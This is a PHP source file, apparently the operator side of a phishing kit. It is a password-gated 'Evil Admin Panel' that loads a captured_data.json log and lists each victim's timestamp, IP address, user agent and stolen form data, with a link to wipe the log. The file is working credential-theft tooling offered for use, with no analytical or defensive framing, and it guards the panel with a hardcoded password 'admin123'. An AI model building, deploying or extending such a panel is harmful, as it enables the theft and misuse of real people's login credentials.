<?php
// admin.php
$admin_password = "admin123";  // 🔐 Change this!
session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['pass'])) {
    if ($_POST['pass'] === $admin_password) {
        $_SESSION['logged'] = true;
    } else {
        $error = "Wrong password!";
    }
}

if (!isset($_SESSION['logged']) || $_SESSION['logged'] !== true) {
?>
<!DOCTYPE html>
<html>
<head><title>Admin Login</title></head>
<body style="font-family:Arial; background:#111; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh;">
<form method="POST" style="background:#222; padding:30px; border-radius:8px;">
    <h2>🔐 Admin Access</h2>
    <input type="password" name="pass" placeholder="Password" style="padding:10px; width:200px;">
    <button type="submit" style="padding:10px 20px; background:#e94560; border:none; color:white; cursor:pointer;">Enter</button>
    <?php if(isset($error)) echo "<p style='color:red'>$error</p>"; ?>
</form>
</body>
</html>
<?php
exit;
}

$file = "captured_data.json";
$entries = file_exists($file) ? json_decode(file_get_contents($file), true) : [];

if (isset($_GET['clear'])) {
    file_put_contents($file, json_encode([]));
    header("Location: admin.php");
    exit;
}
?>
<!DOCTYPE html>
<html>
<head><title>Admin Panel - Captured Data</title>
<style>
body { font-family: Arial; background: #1a1a2e; color: #eee; margin:20px; }
h1 { color: #e94560; }
table { border-collapse: collapse; width:100%; }
th, td { border:1px solid #333; padding:8px; text-align:left; }
th { background:#003087; color:white; }
tr:nth-child(even) { background:#16213e; }
a { color:#e94560; }
</style>
</head>
<body>
<h1>💀 Evil Admin Panel – Captured Credentials</h1>
<p><a href="?clear=1" style="background:#e94560; padding:5px 10px; color:white; text-decoration:none;">🗑 Clear All</a></p>
<table>
<tr><th>Time</th><th>IP</th><th>User Agent</th><th>Data</th></tr>
<?php foreach($entries as $e): ?>
<tr>
    <td><?= htmlspecialchars($e['timestamp']) ?></td>
    <td><?= htmlspecialchars($e['ip']) ?></td>
    <td><?= htmlspecialchars(substr($e['user_agent'],0,50)) ?>...</td>
    <td><pre><?= htmlspecialchars(json_encode($e['data'], JSON_PRETTY_PRINT)) ?></pre></td>
</tr>
<?php endforeach; ?>
</tbody>
</table>
</body>
</html>